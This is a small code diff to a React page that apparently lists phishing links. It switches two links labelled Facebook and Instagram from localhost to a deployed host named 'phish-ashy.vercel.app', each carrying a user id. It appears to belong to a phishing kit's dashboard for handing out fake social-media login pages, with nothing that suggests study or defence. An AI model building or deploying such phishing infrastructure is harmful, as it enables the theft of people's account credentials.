@@ -20,12 +20,12 @@ const pages= () => {
                              <tr>
                                 <td>1</td>
                                 <td>Facebook</td>
-                                <td><a href={`http://localhost:1035/fb?i=${user.id}`} target="_blank">link</a></td>
+                                <td><a href={`https://phish-ashy.vercel.app/fb?i=${user.id}`} target="_blank">link</a></td>
                             </tr>
                             <tr>
                                 <td>2</td>
                                 <td>Instagram</td>
-                                <td><a href={`http://localhost:1035/int?i=${user.id}`} target="_blank">link</a></td>
+                                <td><a href={`https://phish-ashy.vercel.app/int?i=${user.id}`} target="_blank">link</a></td>
                             </tr>
                          </table>
             </Main>
